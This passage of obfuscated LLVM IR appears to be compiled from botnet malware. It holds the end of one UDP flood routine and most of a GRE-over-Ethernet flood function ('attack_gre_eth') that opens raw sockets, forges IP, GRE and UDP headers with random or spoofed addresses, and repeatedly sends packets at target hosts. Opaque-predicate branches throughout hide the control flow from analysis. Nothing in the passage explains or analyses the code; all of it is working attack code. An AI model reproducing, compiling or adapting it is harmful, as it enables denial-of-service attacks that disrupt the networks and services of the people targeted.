  %611 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %610, i32 0, i32 0
  store i32 %604, i32* %611, align 4
  %612 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %613 = load i32, i32* %11, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %612, i64 %614
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i32 0, i32 0
  %617 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %616, i32 0, i32 1
  store i16 0, i16* %617, align 2
  %618 = load i32, i32* %12, align 4
  %619 = load i8*, i8** %29, align 8
  %620 = load i32, i32* %20, align 4
  %621 = sext i32 %620 to i64
  %622 = add i64 52, %621
  %623 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %624 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %625 = load i32, i32* %11, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %624, i64 %626
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i32 0, i32 0
  %629 = bitcast %struct.sockaddr_in* %628 to %struct.sockaddr*
  store %struct.sockaddr* %629, %struct.sockaddr** %623, align 8
  %630 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %631 = load %struct.sockaddr*, %struct.sockaddr** %630, align 8
  %632 = call i64 @sendto(i32 %618, i8* %619, i64 %622, i32 16384, %struct.sockaddr* %631, i32 16)
  br label %633

; <label>:633:                                    ; preds = %566
  %634 = load i32, i32* %11, align 4
  %635 = add nsw i32 %634, 1
  store i32 %635, i32* %11, align 4
  br label %331

; <label>:636:                                    ; preds = %331
  %637 = call i64 @time(i64* null) #6
  %638 = load i32, i32* %24, align 4
  %639 = sext i32 %638 to i64
  %640 = icmp sgt i64 %637, %639
  br i1 %640, label %641, label %642

; <label>:641:                                    ; preds = %636
  br label %659

; <label>:642:                                    ; preds = %636
  %643 = load i32, i32* @x.19
  %644 = load i32, i32* @y.20
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %642
  %651 = load i32, i32* @x.19
  %652 = load i32, i32* @y.20
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %330

; <label>:659:                                    ; preds = %641, %92, %86
  %660 = load i32, i32* @x.19
  %661 = load i32, i32* @y.20
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %659
  %668 = load i32, i32* @x.19
  %669 = load i32, i32* @y.20
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %95
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %112
  %676 = load i32, i32* %11, align 4
  %677 = load i8, i8* %7, align 1
  %678 = zext i8 %677 to i32
  %679 = icmp slt i32 %676, %678
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %183
  %680 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %681 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %682 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %681, i32 0, i32 4
  store i16 %680, i16* %682, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %278
  %683 = load i16, i16* %18, align 2
  %684 = call zeroext i16 @htons(i16 zeroext %683) #7
  %685 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %686 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %685, i32 0, i32 0
  store i16 %684, i16* %686, align 2
  %687 = load i16, i16* %19, align 2
  %688 = call zeroext i16 @htons(i16 zeroext %687) #7
  %689 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %690 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %689, i32 0, i32 1
  store i16 %688, i16* %690, align 2
  %691 = load i32, i32* %20, align 4
  %692 = sext i32 %691 to i64
  %_ = sub i64 0, 8
  %gen = add i64 %_, %692
  %_11 = sub i64 8, %692
  %gen12 = mul i64 %_11, %692
  %_13 = sub i64 8, %692
  %gen14 = mul i64 %_13, %692
  %_15 = shl i64 8, %692
  %693 = add i64 8, %692
  %694 = trunc i64 %693 to i16
  %695 = call zeroext i16 @htons(i16 zeroext %694) #7
  %696 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %697 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %696, i32 0, i32 2
  store i16 %695, i16* %697, align 2
  br label %originalBB10

originalBB19alteredBB:                            ; preds = %originalBB19, %313
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %364
  %698 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %699 = load i32, i32* %11, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %698, i64 %700
  %702 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %701, i32 0, i32 1
  %703 = load i32, i32* %702, align 4
  %704 = call i32 @ntohl(i32 %703) #7
  %705 = call i32 @rand_next()
  %706 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %707 = load i32, i32* %11, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %706, i64 %708
  %710 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %709, i32 0, i32 2
  %711 = load i8, i8* %710, align 4
  %712 = zext i8 %711 to i32
  %_24 = sub i32 0, %705
  %gen25 = add i32 %_24, %712
  %_26 = shl i32 %705, %712
  %_27 = sub i32 0, %705
  %gen28 = add i32 %_27, %712
  %_29 = shl i32 %705, %712
  %_30 = sub i32 %705, %712
  %gen31 = mul i32 %_30, %712
  %_32 = sub i32 %705, %712
  %gen33 = mul i32 %_32, %712
  %713 = lshr i32 %705, %712
  %_34 = sub i32 %704, %713
  %gen35 = mul i32 %_34, %713
  %_36 = sub i32 %704, %713
  %gen37 = mul i32 %_36, %713
  %714 = add i32 %704, %713
  %715 = call i32 @htonl(i32 %714) #7
  %716 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %717 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %716, i32 0, i32 9
  store i32 %715, i32* %717, align 4
  br label %originalBB23

originalBB41alteredBB:                            ; preds = %originalBB41, %408
  %718 = load i16, i16* %15, align 2
  %719 = zext i16 %718 to i32
  %720 = icmp eq i32 %719, 65535
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %443
  %721 = load i16, i16* %18, align 2
  %722 = zext i16 %721 to i32
  %723 = icmp eq i32 %722, 65535
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %473
  %724 = call i32 @rand_next()
  %_50 = shl i32 %724, 65535
  %_51 = sub i32 %724, 65535
  %gen52 = mul i32 %_51, 65535
  %_53 = sub i32 %724, 65535
  %gen54 = mul i32 %_53, 65535
  %725 = and i32 %724, 65535
  %726 = trunc i32 %725 to i16
  %727 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %728 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %727, i32 0, i32 1
  store i16 %726, i16* %728, align 2
  br label %originalBB49

originalBB58alteredBB:                            ; preds = %originalBB58, %498
  %729 = call i32 @rand_next()
  %730 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %731 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %730, i32 0, i32 9
  store i32 %729, i32* %731, align 4
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %518
  %732 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %733 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %732, i32 0, i32 9
  %734 = load i32, i32* %733, align 4
  %735 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %736 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %735, i32 0, i32 9
  store i32 %734, i32* %736, align 4
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %540
  %737 = load i8, i8* %21, align 1
  %738 = icmp ne i8 %737, 0
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %642
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %659
  br label %originalBB74
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 19, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %5
  br label %666

; <label>:95:                                     ; preds = %5
  %96 = load i32, i32* @x.21
  %97 = load i32, i32* @y.22
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %95
  store i32 1, i32* %11, align 4
  %104 = load i32, i32* %12, align 4
  %105 = bitcast i32* %11 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %107, label %116, label %119

; <label>:116:                                    ; preds = %originalBBpart2
  %117 = load i32, i32* %12, align 4
  %118 = call i32 @close(i32 %117)
  br label %666

; <label>:119:                                    ; preds = %originalBBpart2
  %120 = load i32, i32* @x.21
  %121 = load i32, i32* @y.22
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %119
  store i32 0, i32* %11, align 4
  %128 = load i32, i32* @x.21
  %129 = load i32, i32* @y.22
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %136

; <label>:136:                                    ; preds = %308, %originalBBpart24
  %137 = load i32, i32* %11, align 4
  %138 = load i8, i8* %7, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp slt i32 %137, %139
  br i1 %140, label %141, label %311

; <label>:141:                                    ; preds = %136
  %142 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %143 = load i8**, i8*** %13, align 8
  %144 = load i32, i32* %11, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  store i8* %142, i8** %146, align 8
  %147 = load i8**, i8*** %13, align 8
  %148 = load i32, i32* %11, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8*, i8** %147, i64 %149
  %151 = load i8*, i8** %150, align 8
  %152 = bitcast i8* %151 to %struct.iphdr*
  store %struct.iphdr* %152, %struct.iphdr** %25, align 8
  %153 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i64 1
  %155 = bitcast %struct.iphdr* %154 to %struct.grehdr*
  store %struct.grehdr* %155, %struct.grehdr** %26, align 8
  %156 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %157 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %156, i64 1
  %158 = bitcast %struct.grehdr* %157 to %struct.ethhdr*
  store %struct.ethhdr* %158, %struct.ethhdr** %27, align 8
  %159 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %160 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %159, i64 1
  %161 = bitcast %struct.ethhdr* %160 to %struct.iphdr*
  store %struct.iphdr* %161, %struct.iphdr** %28, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i64 1
  %164 = bitcast %struct.iphdr* %163 to %struct.udphdr*
  store %struct.udphdr* %164, %struct.udphdr** %29, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %166 = bitcast %struct.iphdr* %165 to i8*
  %167 = load i8, i8* %166, align 4
  %168 = and i8 %167, 15
  %169 = or i8 %168, 64
  store i8 %169, i8* %166, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = and i8 %172, -16
  %174 = or i8 %173, 5
  store i8 %174, i8* %171, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i8 %175, i8* %177, align 1
  %178 = load i32, i32* %20, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 66, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %15, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 3
  store i16 %186, i16* %188, align 4
  %189 = load i8, i8* %16, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 5
  store i8 %189, i8* %191, align 4
  %192 = load i8, i8* %17, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %214

; <label>:194:                                    ; preds = %141
  %195 = load i32, i32* @x.21
  %196 = load i32, i32* @y.22
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %194
  %203 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 4
  store i16 %203, i16* %205, align 2
  %206 = load i32, i32* @x.21
  %207 = load i32, i32* @y.22
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %214

; <label>:214:                                    ; preds = %originalBBpart28, %141
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 47, i8* %216, align 1
  %217 = load i32, i32* %23, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %221 = load i32, i32* %11, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  %228 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %229 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %230 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %232 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %233 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %232, i32 0, i32 2
  store i16 %231, i16* %233, align 1
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = bitcast %struct.iphdr* %234 to i8*
  %236 = load i8, i8* %235, align 4
  %237 = and i8 %236, 15
  %238 = or i8 %237, 64
  store i8 %238, i8* %235, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %240 = bitcast %struct.iphdr* %239 to i8*
  %241 = load i8, i8* %240, align 4
  %242 = and i8 %241, -16
  %243 = or i8 %242, 5
  store i8 %243, i8* %240, align 4
  %244 = load i8, i8* %14, align 1
  %245 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 1
  store i8 %244, i8* %246, align 1
  %247 = load i32, i32* %20, align 4
  %248 = sext i32 %247 to i64
  %249 = add i64 28, %248
  %250 = trunc i64 %249 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %15, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = trunc i32 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 3
  store i16 %258, i16* %260, align 4
  %261 = load i8, i8* %16, align 1
  %262 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 5
  store i8 %261, i8* %263, align 4
  %264 = load i8, i8* %17, align 1
  %265 = icmp ne i8 %264, 0
  br i1 %265, label %266, label %270

; <label>:266:                                    ; preds = %214
  %267 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %268 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 4
  store i16 %267, i16* %269, align 2
  br label %270

; <label>:270:                                    ; preds = %266, %214
  %271 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 6
  store i8 17, i8* %272, align 1
  %273 = call i32 @rand_next()
  %274 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 8
  store i32 %273, i32* %275, align 4
  %276 = load i8, i8* %22, align 1
  %277 = icmp ne i8 %276, 0
  br i1 %277, label %278, label %284

; <label>:278:                                    ; preds = %270
  %279 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 9
  %281 = load i32, i32* %280, align 4
  %282 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  store i32 %281, i32* %283, align 4
  br label %292

; <label>:284:                                    ; preds = %270
  %285 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  %287 = load i32, i32* %286, align 4
  %288 = sub i32 %287, 1024
  %289 = xor i32 %288, -1
  %290 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  store i32 %289, i32* %291, align 4
  br label %292

; <label>:292:                                    ; preds = %284, %278
  %293 = load i16, i16* %18, align 2
  %294 = call zeroext i16 @htons(i16 zeroext %293) #7
  %295 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %296 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %295, i32 0, i32 0
  store i16 %294, i16* %296, align 2
  %297 = load i16, i16* %19, align 2
  %298 = call zeroext i16 @htons(i16 zeroext %297) #7
  %299 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %300 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %299, i32 0, i32 1
  store i16 %298, i16* %300, align 2
  %301 = load i32, i32* %20, align 4
  %302 = sext i32 %301 to i64
  %303 = add i64 8, %302
  %304 = trunc i64 %303 to i16
  %305 = call zeroext i16 @htons(i16 zeroext %304) #7
  %306 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 2
  store i16 %305, i16* %307, align 2
  br label %308

; <label>:308:                                    ; preds = %292
  %309 = load i32, i32* %11, align 4
  %310 = add nsw i32 %309, 1
  store i32 %310, i32* %11, align 4
  br label %136

; <label>:311:                                    ; preds = %136
  br label %312

; <label>:312:                                    ; preds = %665, %311
  store i32 0, i32* %11, align 4
  br label %313

; <label>:313:                                    ; preds = %originalBBpart266, %312
  %314 = load i32, i32* %11, align 4
  %315 = load i8, i8* %7, align 1
  %316 = zext i8 %315 to i32
  %317 = icmp slt i32 %314, %316
  br i1 %317, label %318, label %643

; <label>:318:                                    ; preds = %313
  %319 = load i8**, i8*** %13, align 8
  %320 = load i32, i32* %11, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds i8*, i8** %319, i64 %321
  %323 = load i8*, i8** %322, align 8
  store i8* %323, i8** %33, align 8
  %324 = load i8*, i8** %33, align 8
  %325 = bitcast i8* %324 to %struct.iphdr*
  store %struct.iphdr* %325, %struct.iphdr** %34, align 8
  %326 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i64 1
  %328 = bitcast %struct.iphdr* %327 to %struct.grehdr*
  store %struct.grehdr* %328, %struct.grehdr** %35, align 8
  %329 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %330 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %329, i64 1
  %331 = bitcast %struct.grehdr* %330 to %struct.ethhdr*
  store %struct.ethhdr* %331, %struct.ethhdr** %36, align 8
  %332 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %333 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %332, i64 1
  %334 = bitcast %struct.ethhdr* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %37, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %37, align 8
